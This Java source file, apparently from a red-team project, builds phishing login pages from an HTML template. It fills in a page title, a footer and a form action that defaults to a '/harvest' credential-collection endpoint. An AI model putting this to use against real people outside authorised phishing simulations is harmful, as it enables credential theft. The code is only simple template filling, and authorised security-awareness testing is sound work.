package fr.redteam.web;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

/**
 * Génère des pages de phishing à partir du template login-phishing.html.
 * Remplace les placeholders {{TITLE}}, {{FORM_ACTION}}, {{FOOTER}}.
 */
public class PhishingPageGenerator {

    private static final String TEMPLATE_PATH = "/templates/login-phishing.html";

    /**
     * Génère la page HTML en remplaçant les placeholders.
     *
     * @param title      Titre de la page (ex. "Connexion - Entreprise")
     * @param formAction URL de soumission du formulaire (ex. "/harvest")
     * @param footer     Texte du pied de page (optionnel)
     * @return HTML généré, ou chaîne vide si le template est introuvable
     */
    public String generate(String title, String formAction, String footer) {
        String template = loadTemplate();
        if (template == null || template.isEmpty()) {
            return "";
        }
        Map<String, String> vars = new HashMap<>();
        vars.put("{{TITLE}}", title != null ? title : "Connexion");
        vars.put("{{FORM_ACTION}}", formAction != null ? formAction : "/harvest");
        vars.put("{{FOOTER}}", footer != null ? footer : "Accès réservé. Usage autorisé uniquement.");

        String result = template;
        for (Map.Entry<String, String> e : vars.entrySet()) {
            result = result.replace(e.getKey(), e.getValue());
        }
        return result;
    }

    /**
     * Génère avec des valeurs par défaut (titre "Connexion", action "/harvest").
     */
    public String generate() {
        return generate("Connexion", "/harvest", "Accès sécurisé.");
    }

    private String loadTemplate() {
        try (InputStream is = getClass().getResourceAsStream(TEMPLATE_PATH)) {
            if (is == null) return "";
            StringBuilder sb = new StringBuilder();
            try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
